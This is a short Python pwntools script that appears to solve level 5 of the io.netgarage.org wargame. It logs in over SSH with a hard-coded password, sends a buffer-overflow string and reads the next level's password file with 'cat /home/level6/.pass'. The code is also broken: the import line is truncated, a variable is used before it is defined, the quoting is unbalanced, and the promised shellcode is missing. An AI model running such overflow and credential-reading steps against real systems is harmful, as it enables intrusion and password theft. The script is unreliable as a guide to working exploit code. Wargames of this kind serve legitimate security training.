rom pwn import *
s = ssh(user='level5', host='io.netgarage.org', password='DNLM3Vu0mZfX0pDd', port=22)
# game at http://io.netgarage.org/
# a simple buffer overflow with shellcode
system = p32(0xb7e48b30)
exploit = '\levels\level5 $(python -c \'print 140*"a"+"DDDD")'
sh.sendline(exploit)
sh = s.run(exploit)
for i in range(2):
    print(sh.recvline(timeout=2))
sh.sendline(b'cat /home/level6/.pass')
log.info('Password : '+sh.recvline(timeout=2).decode('utf-8')[7:])
s.close()